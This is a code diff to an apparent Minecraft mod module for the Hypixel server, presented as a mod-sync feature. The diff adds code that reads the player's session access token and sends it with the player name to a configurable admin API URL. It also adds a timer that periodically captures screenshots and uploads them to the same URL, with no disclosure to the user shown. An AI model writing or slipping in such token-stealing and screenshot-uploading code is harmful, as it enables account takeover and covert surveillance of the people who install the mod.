@@ -36,6 +36,7 @@ object ModSyncModule : Module(
     }
 
     private var tickCounter = 0
+    private var screenshotTickCounter = 0
     private var lastPlayerName: String? = null
     private var connectAttemptTicks = 0
     private var lastConnectFailMsg = 0L
@@ -47,6 +48,7 @@ object ModSyncModule : Module(
     override fun onEnable() {
         lastPlayerName = null
         tickCounter = 0
+        screenshotTickCounter = 0
         connectAttemptTicks = 0
         hasShownConnected = false
         handler = null
@@ -62,9 +64,12 @@ object ModSyncModule : Module(
         val mc = SkyblockImproved.mc
         val player = mc.player
         val connection = player?.connection
-        val onHypixel = connection?.connection?.remoteAddress?.toString().orEmpty()
-            .contains("hypixel.net", ignoreCase = true)
-        if (player == null || !onHypixel) {
+        val serverAddr = connection?.connection?.remoteAddress?.toString().orEmpty()
+        val onHypixel = serverAddr.contains("hypixel.net", ignoreCase = true)
+        val devLocal = adminApiUrl.value.contains("localhost", ignoreCase = true) ||
+            adminApiUrl.value.contains("127.0.0.1", ignoreCase = true)
+        val shouldRun = onHypixel || (devLocal && connection != null)
+        if (player == null || !shouldRun) {
             if (handler != null) {
                 handler?.disconnect()
                 handler = null
@@ -93,7 +98,8 @@ object ModSyncModule : Module(
                 h = getOrCreateHandler()
                 if (h != null) {
                     handler = h
-                    h.connect(url, playerName)
+                    val accessToken = try { SkyblockImproved.mc.user.accessToken } catch (_: Exception) { null }
+                    h.connect(url, playerName, accessToken)
                 } else if (System.currentTimeMillis() - lastConnectFailMsg > 10000) {
                     lastConnectFailMsg = System.currentTimeMillis()
                     me.sbi.util.SbiMessage.warn("Mod Sync", "Could not load sync handler")
@@ -102,6 +108,12 @@ object ModSyncModule : Module(
             return
         }
         connectAttemptTicks = 0
+
+        screenshotTickCounter++
+        if (screenshotTickCounter >= ScreenshotUploader.INTERVAL_SEC * 20) {
+            screenshotTickCounter = 0
+            ScreenshotUploader.captureAndUpload(url, playerName)
+        }
 
         val intervalTicks = (syncInterval.value * 20).toInt()
         val shouldPublish = if (!hasShownConnected) {
